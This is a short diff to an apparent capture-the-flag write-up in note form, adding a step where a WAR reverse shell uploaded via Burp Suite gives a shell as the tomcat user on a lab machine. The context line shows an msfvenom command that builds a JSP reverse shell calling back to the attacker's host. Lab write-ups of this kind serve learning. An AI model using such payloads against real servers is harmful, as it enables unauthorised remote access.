@@ -26,5 +26,7 @@ Using command `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.98 LPORT=12
 ## uploading war file `sh.war` using burp suite repeater
 ![[Pasted image 20210928104229.png]]
 ![[Pasted image 20210928104539.png]]
-
+## Getting initial shell as tomcat user via running war file on url https://10.10.10.250/sh/ 
+Getting initial shell as tomcat user via running war file on url https://10.10.10.250/sh/ (where sh is name of war reverse shell).
+![[Pasted image 20210928104900.png]]
 
